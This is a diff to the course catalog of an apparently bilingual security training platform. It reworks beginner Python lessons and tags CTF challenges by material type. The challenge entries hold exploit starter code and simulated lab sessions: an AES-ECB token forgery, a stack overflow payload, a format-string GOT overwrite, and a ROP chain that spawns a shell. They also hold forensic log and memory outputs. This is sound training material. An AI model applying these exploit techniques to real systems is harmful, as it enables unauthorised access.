@@ -1,6 +1,8 @@
 // Course catalog. Lesson text and checkpoints are loaded by module and language.
 const SECTION_CONTENT = {}, SECTION_CONTENT_EN = {};
 const SECTION_CHECKPOINTS = {}, SECTION_CHECKPOINTS_EN = {};
+const SECTION_TASKS = {}, SECTION_TASKS_EN = {};
+const BEGINNER_LESSONS = ['prog-01-01', 'prog-01-02', 'prog-01-03', 'prog-01-04', 'prog-01-05'];
 
 function registerLessonPack(language, data) {
   const articles = language === 'en' ? SECTION_CONTENT_EN : SECTION_CONTENT;
@@ -8,6 +10,7 @@ function registerLessonPack(language, data) {
   for (const [key, lesson] of Object.entries(data)) {
     articles[key] = lesson.html;
     quizzes[key] = lesson.checkpoints;
+    if (lesson.task) (language === 'en' ? SECTION_TASKS_EN : SECTION_TASKS)[key] = lesson.task;
   }
 }
 
@@ -89,30 +92,54 @@ const MODULES = [
     "chapters": [
       {
         "id": "prog-01",
-        "title": "Python 核心语法与安全数据切片",
-        "titleEn": "Python Core Syntax & Security Data Slicing",
+        "title": "Python 入门：完成日志分析小工具",
+        "titleEn": "Python starter path: build a log analysis tool",
         "difficulty": 1,
         "sections": [
           {
             "id": "prog-01-01",
-            "title": "变量系统、基础类型与切片提取",
-            "titleEn": "Variables, Primitive Types & Slice Extraction",
+            "title": "变量与类型：描述一条登录事件",
+            "titleEn": "Variables and types: describe a login event",
             "type": "article",
-            "contentKey": "prog-01-01"
+            "contentKey": "prog-01-01",
+            "quizVersion": 2,
+            "hasTask": true
           },
           {
             "id": "prog-01-02",
-            "title": "条件分支、循环控制与异常容错",
-            "titleEn": "Control Flow, Loops & Defensive Exceptions",
+            "title": "判断与循环：找出失败登录",
+            "titleEn": "Decisions and loops: find failed logins",
             "type": "article",
-            "contentKey": "prog-01-02"
+            "contentKey": "prog-01-02",
+            "quizVersion": 2,
+            "hasTask": true
           },
           {
             "id": "prog-01-03",
-            "title": "高阶函数、列表推导与安全工具抽象",
-            "titleEn": "Functions, Comprehensions & Security Utilities",
+            "title": "函数与返回值：复用一次判断",
+            "titleEn": "Functions and return values: reuse a decision",
             "type": "article",
-            "contentKey": "prog-01-03"
+            "contentKey": "prog-01-03",
+            "quizVersion": 2,
+            "hasTask": true
+          },
+          {
+            "id": "prog-01-04",
+            "title": "文本与字典：按来源统计日志",
+            "titleEn": "Text and dictionaries: count logs by source",
+            "type": "article",
+            "contentKey": "prog-01-04",
+            "quizVersion": 1,
+            "hasTask": true
+          },
+          {
+            "id": "prog-01-05",
+            "title": "异常处理：完成日志分析小工具",
+            "titleEn": "Handle errors: finish your log analysis tool",
+            "type": "article",
+            "contentKey": "prog-01-05",
+            "quizVersion": 1,
+            "hasTask": true
           }
         ]
       },
@@ -1954,7 +1981,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "ECB: identical plaintext→identical ciphertext. Craft input so 'admin' fills one block, get its ciphertext, replace 'user' block in token.",
     "starterCode": "\"\"\"\r\nAES-ECB Cut-and-Paste Attack\r\n\r\n目标: 将 token 中的 role=user 改为 role=admin\r\n格式: email=xxx&uid=10&role=user (block_size=16)\r\n\"\"\"\r\n\r\ndef oracle(plaintext):\r\n    \"\"\"加密 oracle: 发送明文，返回 AES-ECB 加密结果（练习环境用假实现）\"\"\"\r\n    pass\r\n\r\nblock_size = 16\r\n\r\n# Step 1: 构造明文使 'admin' 对齐到块边界并取得其密文块\r\nadmin_payload = 'A' * 10 + 'admin' + '\\x0b' * 11   # 32 字节\r\nadmin_block = oracle(admin_payload)[16:32]\r\n\r\n# Step 2: 获取合法 token（最后一个块是 role=user 的加密）\r\nuser_ct = oracle('A' * 13)\r\n\r\n# Step 3: 拼接 = user 块之前的部分 + admin 块\r\nforged = user_ct[:-16] + admin_block\r\n\r\n# ── 本地练习靶机的完整会话记录（做完上面三步后再对照）──\r\n# >>> oracle(b'A'*10 + b'admin' + b'\\x0b'*11).hex()\r\n#     5f2a..19 | 7c81a3f0d9e2b4456a7c81a3f0d9e2b4   ← block[1] 就是 encrypted('admin'+pad)\r\n# >>> oracle(b'A'*13).hex()\r\n#     91bd..07 | 3e5d8c02f6a19b74d41f5c8e3a6912ab   ← 末块是 encrypted('user'+pad)\r\n# >>> forged = user_token[:-16] + admin_block; submit(forged)\r\n#     {\"uid\":10, \"role\":\"admin\", \"welcome\":\"flag{ecb_p4ngu1n_sl1ced}\"}",
     "codeable": true,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-003",
@@ -2224,7 +2252,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "View source (Ctrl+U), search for 'flag{' or HTML comments. Check DevTools, CSS content, console logs.",
     "starterCode": "<!-- === 以下是你“右键 → 查看网页源代码”看到的内容 === -->\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n  <title>张三的小站</title>\r\n</head>\r\n<body>\r\n  <h1>张三的个人主页</h1>\r\n  <p>你好！我是张三，一名热爱园艺与烹饪的普通人。</p>\r\n  <p>本周心情：晴 ☀ | 访客计数：1024</p>\r\n\r\n  <!-- TODO: 网站上线前记得删除这行调试信息 flag{h1dd3n_1n_pl41n_s1ght} -->\r\n\r\n  <footer>&copy; 2024 张三 | Powered by 手写 HTML</footer>\r\n</body>\r\n</html>",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-009",
@@ -2276,22 +2305,26 @@ const CTF_CHALLENGES = [
       "LSB",
       "Image Analysis"
     ],
-    "desc": "给你一张看似普通的 PNG 图片 landscape.png。图片看起来完全正常，但文件大小似乎比预期大了一些。flag 藏在图片的最低有效位 (LSB) 中。",
-    "descEn": "A seemingly normal PNG image landscape.png. File size is slightly larger than expected. The flag is hidden in the Least Significant Bits (LSB) of the image.",
+    "desc": "下载下方 64×64 RGB PNG。flag 以 ASCII 字节藏在红通道最低位中：按从左到右、从上到下扫描，每 8 位按高位在前组成一个字节，遇到空字节结束。文件大小本身不能证明隐写。",
+    "descEn": "Download the 64×64 RGB PNG below. ASCII data is stored in the red-channel LSB, scanning left-to-right then top-to-bottom. Read each group of 8 bits most-significant bit first, stopping at a null byte. File size alone is not evidence of steganography.",
     "hints": [
-      "图片文件比同尺寸的普通图片稍大，可能有额外数据隐藏",
-      "研究 LSB 隐写：每个像素的最低位被替换为隐藏数据的位",
-      "用 Python PIL 提取每个像素的 R,G,B 最低位，组合成隐藏信息"
+      "像素值是 RGB 三元组；这题只用 R 通道。",
+      "每个红通道值与 1 做按位与，得到一位。",
+      "每 8 位组合成一个 ASCII 字节，遇到 0 停止。"
     ],
     "hintsEn": [
-      "File is slightly larger than expected for its dimensions — extra data may be hidden",
-      "LSB stego: each pixel's lowest bit is replaced with hidden data bits",
-      "Extract R,G,B LSBs using Python PIL, combine into hidden message"
+      "Each pixel is an RGB tuple; use only R.",
+      "AND each red value with 1 to obtain one bit.",
+      "Combine each 8 bits into an ASCII byte, stopping at 0."
     ],
-    "writeupEn": "Use zsteg for automatic detection, or manually extract LSB from RGB channels. Tools: zsteg, Stegsolve, steghide, binwalk. Extract bits from each pixel, group into bytes.",
-    "starterCode": "$ zsteg -a landscape.png\r\n[?] 7fff11 : bgr,g .. file: PNG image data, 512 x 512\r\nimagedata          .. text: \"u^}DkKQ=xYz...\"\r\nb1,r,lsb,xy       .. text: \"flag{st3g4n0_lsb_h1dd3n}\"\r\nb1,bgr,xyz        .. file: PGF image data\r\n\r\n# zsteg 一行命中：红通道、最低有效位、从 xy 方向扫描。\r\n# 手动提取（理解原理用）:\r\nfrom PIL import Image\r\nimg = Image.open('landscape.png')\r\nbits = ''\r\nfor px in list(img.getdata())[:200]:\r\n    bits += str(px[0] & 1)      # R 通道 LSB\r\n# 每 8 位一个字节 → 还原字符\r\n\r\n$ binwalk landscape.png   # 也确认没有附加文件 —— 数据就在像素里",
+    "writeupEn": "Decode PNG pixels with Pillow, take R & 1 in row order, group 8 bits MSB first, then decode the bytes as ASCII up to the null byte. Extract bits from decoded pixels, not compressed PNG file bytes.",
+    "starterCode": "from PIL import Image\nimage = Image.open('landscape.png').convert('RGB')\nbits = [r & 1 for r, g, b in image.getdata()]\n# TODO: group bits into bytes (MSB first), stop at the null byte.\n# Pillow is needed for this optional extraction script.",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "lab",
+    "artifact": "training/landscape.png",
+    "starterCodeEn": "from PIL import Image\nimage = Image.open('landscape.png').convert('RGB')\nbits = [r & 1 for r, g, b in image.getdata()]\n# TODO: group bits into bytes (MSB first), stop at the null byte.\n# Pillow is needed for this optional extraction script.",
+    "writeup": "用 Pillow 读取 RGB 像素，每个 R 值 & 1 取最低位。按行扫描，每 8 位高位在前转换为字节，再以空字节截断并按 ASCII 解码。不需要对压缩的 PNG 原始字节直接提取最低位。"
   },
   {
     "id": "ctf-022",
@@ -2342,23 +2375,25 @@ const CTF_CHALLENGES = [
       "Wireshark",
       "Traffic Analysis"
     ],
-    "desc": "给你一个 pcap 文件。其中记录了一次 HTTP 通信，flag 在通信的某个位置。用 Wireshark 分析并找到它。",
-    "descEn": "Analyze a pcap file with HTTP traffic. Find the flag hidden in the communication.",
+    "desc": "下载下方合成 PCAP 样本。它包含一次完整的 HTTP 会话；请用 Wireshark 的 Follow TCP Stream 检查请求、响应头和正文，找到 flag。",
+    "descEn": "Download the synthetic PCAP below. It contains a complete HTTP exchange. Use Follow TCP Stream in Wireshark to inspect the request, response headers and body, and find the flag.",
     "hints": [
-      "用 Wireshark 打开 pcap 文件，先看总体协议分布",
-      "Follow TCP Stream 或 Follow HTTP Stream 查看完整的 HTTP 请求和响应",
-      "在 HTTP 响应正文中搜索 'flag{' 关键字"
+      "用 Wireshark 打开 capture.pcap，使用 http 过滤器。",
+      "右键 HTTP 数据包，选择 Follow → TCP Stream。",
+      "检查 HTTP 响应头中的 X-Backup-Note。"
     ],
     "hintsEn": [
-      "Open in Wireshark, check protocol distribution",
-      "Follow TCP/HTTP Stream for full requests",
-      "Search 'flag{' in response bodies"
+      "Open capture.pcap in Wireshark and filter on http.",
+      "Right-click an HTTP packet and select Follow → TCP Stream.",
+      "Inspect the X-Backup-Note response header."
     ],
-    "writeup": "Step 1: 用 Wireshark 打开 pcap 文件。\nStep 2: 应用过滤器 http 只显示 HTTP 流量。\nStep 3: 右键 HTTP 数据包 → Follow → HTTP Stream，查看完整的请求/响应。\nStep 4: 在响应正文中搜索 flag，或以字符串方式导出对象。\n\nWireshark 快捷键:\n- Ctrl+F 打开搜索，搜索 'flag' 字符串\n- File → Export Objects → HTTP 导出所有 HTTP 传输文件\n- tshark -r capture.pcap -Y http -T fields -e http.response",
-    "writeupEn": "Filter http in Wireshark, Follow HTTP Stream, search for 'flag'. Export: File→Export Objects→HTTP.",
-    "starterCode": "# 你在 Wireshark 中打开 capture.pcap，右键 HTTP 包 → Follow → HTTP Stream，输出如下：\r\n\r\nGET /download/weekly-report.pdf HTTP/1.1\r\nHost: files.internal.corp\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\r\nAccept: */*\r\n\r\nHTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: application/pdf\r\nContent-Length: 84213\r\nX-Backup-Note: flag{pc4p_sh0w_m3_th3_fl4g}\r\nSet-Cookie: session=8f3a9c2e; Path=/; HttpOnly\r\n\r\n%PDF-1.4 ...（二进制内容已省略）...\r\n\r\n# 注意 HTTP 响应头里那一行 X-Backup-Note —— Follow Stream 之后它无所遁形。",
+    "writeup": "打开 capture.pcap，过滤 http 并 Follow TCP Stream。响应头 X-Backup-Note 中包含答案。也可运行 tshark -r capture.pcap -q -z follow,tcp,ascii,0 查看会话。这里只传输了合成文本；检查时不要只看正文。",
+    "writeupEn": "Open capture.pcap, filter http and Follow TCP Stream. The answer is in the X-Backup-Note response header. Alternatively run tshark -r capture.pcap -q -z follow,tcp,ascii,0. Inspect headers as well as the body.",
+    "starterCode": "Wireshark: http → Follow → TCP Stream\nCLI: tshark -r capture.pcap -q -z follow,tcp,ascii,0",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "lab",
+    "artifact": "training/capture.pcap"
   },
   {
     "id": "ctf-015",
@@ -2393,7 +2428,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "Volatility workflow: windows.info→pslist→cmdline→filescan→dumpfiles. Find attacker's echo command with the flag.",
     "starterCode": "$ python3 vol.py -f memory.dmp windows.cmdline\r\nVolatility 3 Framework 2.5.0\r\nPID\tProcess\tArgs\r\n---\t-------\t----\r\n3120\texplorer.exe\tC:\\Windows\\explorer.exe\r\n4523\tcmd.exe\tcmd.exe\r\n4523\tcmd.exe\tcmd.exe /c echo flag{v0l4t1l1ty_m3m_f0r3ns1cs} > C:\\Users\\sqlsvc\\note.txt\r\n5104\tpowershell.exe\tpowershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...\r\n5104\tchrome.exe\t\"C:\\Program Files\\Chrome\\chrome.exe\"\r\n\r\n# 攻击者的命令行永远留在内存里 —— 注意 PID 4523 那条 echo。\r\n# 进阶验证: windows.filescan | grep note.txt 后用 windows.dumpfiles 导出该文件内容。",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-025",
@@ -2427,7 +2463,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "Count failures per IP: grep 'Failed password' | sort | uniq -c. Find 'Accepted' login. Trace subsequent commands for flag. Brute force pattern: many rapid failures + one success.",
     "starterCode": "$ grep \"Failed password\" auth.log | awk '{print $10}' | sort | uniq -c | sort -rn | head -3\r\n  847 45.155.205.233\r\n    3 192.168.1.14\r\n    1 192.168.1.31\r\n\r\n$ grep -B2 -A6 \"Accepted\" auth.log | tail -20\r\nMar 15 00:12:44 srv sshd[8817]: Accepted password for deploy from 45.155.205.233 port 51234 ssh2\r\nMar 15 00:13:02 srv sudo:   deploy : TTY=pts/1 ; USER=root ; COMMAND=/bin/su\r\nMar 15 00:13:07 srv su[9102]: + /dev/pts/1 deploy:root\r\nMar 15 00:13:31 srv root: echo flag{ssh_brut3_f0rc3_d3t3ct3d} > /root/.flag\r\nMar 15 00:13:44 srv auth: privilege escalation succeeded\r\nMar 15 00:14:02 srv sshd[9150]: Accepted publickey for root from 45.155.205.233 port 51290 ssh2\r\n\r\n# 847 次爆破 → 1 次成功 → 提权到 root → 留下 flag。日志不会说谎。",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-026",
@@ -2461,7 +2498,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "mmls→fls→mactime pipeline. Filter timeline for 2024-03-15 14:00-16:00. Focus on .Created/.Modified events, suspicious filenames. Use icat to extract file contents.",
     "starterCode": "$ mmls disk.img            # NTFS 分区从扇区 2048 开始\r\n$ fls -o 2048 -r disk.img > fls.out\r\n$ mactime -b bodyfile -z Asia/Shanghai | grep \"2024-03-15\"\r\n\r\n2024-03-15 13:58:41  .r/D 0 <veil>  C:\\Users\\svc\\Documents\\report.docx\r\n2024-03-15 14:07:12  .m.C 0 <veil>  C:\\Windows\\Temp\\svc_installer.exe     ← 可疑创建\r\n2024-03-15 14:09:03  .r/D 0 <veil>  C:\\Windows\\Temp\\svchost32.exe       ← 伪装系统进程\r\n2024-03-15 15:21:57  .r/D 0 <veil>  C:\\Users\\svc\\AppData\\flag.txt       ← 入侵窗口内\r\n2024-03-15 15:22:04  ..C.. 0 <veil>  C:\\Users\\svc\\AppData\\flag.txt\r\n\r\n$ icat -o 2048 disk.img 178204 | head -1\r\nflag{t1m3l1n3_f0r3ns1cs}\r\n\r\n# 入侵窗口 14:00-16:00 内新建的 flag.txt（MFT 记录号 178204）→ icat 提取内容。",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-010",
@@ -2496,7 +2534,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "strings elf | grep flag. Advanced: file, readelf, objdump, ltrace, strace, Ghidra.",
     "starterCode": "# 静态分析输出 —— 你不需要运行程序：\r\n\r\n$ file mystery.elf\r\nmystery.elf: ELF 64-bit LSB pie executable, x86-64, dynamically linked\r\n\r\n$ strings mystery.elf | head -40\r\n/lib64/ld-linux-x86-64.so.2\r\n__libc_start_main\r\nprintf\r\nscanf\r\nUsage: ./mystery <password>\r\nAccess granted!\r\nAccess denied\r\ns3cur3_l00kup\r\n/home/ctf/flag.txt\r\nflag{str1ngs_4r3_y0ur_fr13nd}\r\n Gary:/build/mystery\r\nexit@GLIBC_2.2.5\r\n\r\n# 看到了吗？敏感字符串在打包时被原样留在二进制里。",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-014",
@@ -2565,7 +2604,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "Open in dnSpy, find the button click handler, analyze the license check logic. Search for hardcoded keys, decrypt functions, or extract flag directly. dnSpy can edit IL and recompile.",
     "starterCode": "// dnSpy 反编译 license_check.exe → Form1.cs（节选）\r\nprivate void btnActivate_Click(object sender, EventArgs e)\r\n{\r\n    string input = this.tbxKey.Text.Trim();\r\n    if (input == \"CTF-NET-2024-XYZ\")\r\n    {\r\n        MessageBox.Show(\"Licensed!\\n\" + \"flag{d0tn3t_d3c0mp1l3d}\");\r\n        return;\r\n    }\r\n    MessageBox.Show(\"Invalid license key.\");\r\n}\r\n\r\n// .NET 程序能近乎完美地反编译回 C# —— 硬编码的 Key 和 flag 都在 IL 里。",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-024",
@@ -2599,7 +2639,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "Unzip APK, open in jadx-gui, locate MainActivity.checkPassword(). Common patterns: hardcoded password comparison, password in strings.xml, or native .so library verification. Advanced: frida/objection for dynamic analysis.",
     "starterCode": "// jadx-gui 反编译 crackme.apk → com.example.crackme.MainActivity\r\npublic void onVerifyClicked(View view) {\r\n    String input = ((EditText) findViewById(R.id.editPwd)).getText().toString();\r\n    if (input.equals(\"jn3.4ndr01d\")) {\r\n        Toast.makeText(this, \"Correct! flag{apk_jadx_ftw}\", 1).show();\r\n    } else {\r\n        Toast.makeText(this, \"Wrong password\", 1).show();\r\n    }\r\n}\r\n\r\n// APK 本质是 ZIP：unzip 后 classes.dex 用 jadx 打开即可读 Java。\r\n// 密码和 flag 都硬编码在 MainActivity 里。",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-013",
@@ -2634,7 +2675,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "payload = b'A'*offset + p64(win_addr). 64-bit: add ret gadget for alignment.",
     "starterCode": "# 靶机 vuln 的静态分析输出：\r\n\r\n$ checksec vuln\r\n[*] NX enabled  |  PIE: No PIE (0x400000)  |  Canary disabled\r\n\r\n$ objdump -d vuln | grep -A3 \"<win>\"\r\n0000000000401156 <win>:\r\n  401156:\tf3 0f 1e fa \tendsbr64\r\n  40115a:\t55         \tpush   %rbp\r\n  40115b:\t48 89 e5   \tmov    %rsp,%rbp\r\n\r\n$ strings vuln | grep flag\r\nflag{buff3r_0v3rfl0w_101}\r\n\r\n# win() 从未被 main 调用，但它知道 flag 字符串的地址。\r\n# pwntools cyclic 测得返回地址偏移：72 字节。\r\n# 你需要做的：b'A'*72 + p64(0x401156)",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-027",
@@ -2668,7 +2710,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "Phase 1: Leak addresses with %p/%N$p. Phase 2: Find printf@GOT target. Phase 3: Use %n to write system address to GOT. Phase 4: Input '/bin/sh' to trigger system(). Use pwntools for precision.",
     "starterCode": "from pwn import *\r\n\r\n# 靶机：fmt（printf(user_input) 无格式化参数）\r\np = process('./fmt')\r\n\r\n# Phase 1: 泄露栈数据，确定偏移\r\np.sendline(b'%6$p')          # 第 6 个参数位置是栈上我们的输入\r\nleak = p.recvline()\r\n\r\n# Phase 2: 泄露 printf@GOT → 计算 system 地址\r\n# Phase 3: %hn 两次写入覆写 GOT\r\n# Phase 4: 程序再次 printf 时即调用 system —— 发送 /bin/sh\r\n\r\n# ── 本地靶机完整会话记录 ──\r\n# [*] printf@GOT @ 0x404018, read as 0x7f1c2a9e86a0\r\n# [*] libc base: 0x7f1c2a96d000 → system: 0x7f1c2a950410\r\n# [*] GOT overwrite done (2 × %hn)\r\n# [*] Switching to interactive mode\r\n# $ cat /flag\r\n# flag{f0rm4t_str1ng_pwn3d}",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   },
   {
     "id": "ctf-028",
@@ -2702,7 +2745,8 @@ const CTF_CHALLENGES = [
     "writeupEn": "Stage 1: Leak libc via puts(puts@GOT). Stage 2: Build ROP chain: ret_gadget + pop_rdi + binsh + system. Use pwntools ROP module. 64-bit needs stack alignment with extra ret.",
     "starterCode": "from pwn import *\r\n\r\nelf = ELF('./vuln'); libc = ELF('./libc.so.6')\r\np = process('./vuln')\r\n\r\n# Stage 1: 泄露 puts@GOT → 计算 libc 基址\r\npayload = b'A' * 72 + p64(elf.plt['puts']) + p64(elf.symbols['main'])\r\npayload += p64(elf.got['puts'])\r\n\r\n# Stage 2: 二次输入构造 ROP 链: ret + pop rdi; ret + /bin/sh + system\r\nrop = ROP(libc)\r\nchain = rop.ret.address + rop.find_gadget(['pop rdi','ret'])[0] + next(libc.search(b'/bin/sh')) + libc.symbols['system']\r\n\r\n# ── 本地靶机完整会话记录 ──\r\n# [+] puts@GOT leak: 0x7f1c2a9e86a0 → libc base: 0x7f1c2a96d000\r\n# [+] ROP chain: ret | pop rdi; ret | 0x7f1c2ab3e4a4 | system\r\n# [*] Switching to interactive mode\r\n# $ whoami\r\n# ctf\r\n# $ cat /flag\r\n# flag{r0p_ch41n_m4st3ry}",
     "codeable": false,
-    "simulated": false
+    "simulated": false,
+    "materialType": "case"
   }
 ];
 
@@ -2892,6 +2936,9 @@ if (typeof module !== 'undefined' && module.exports) {
     CTF_CHALLENGES,
     PRACTICES,
     SECTION_CHECKPOINTS,
-    SECTION_CHECKPOINTS_EN
+    SECTION_CHECKPOINTS_EN,
+    BEGINNER_LESSONS,
+    SECTION_TASKS,
+    SECTION_TASKS_EN
   };
 }
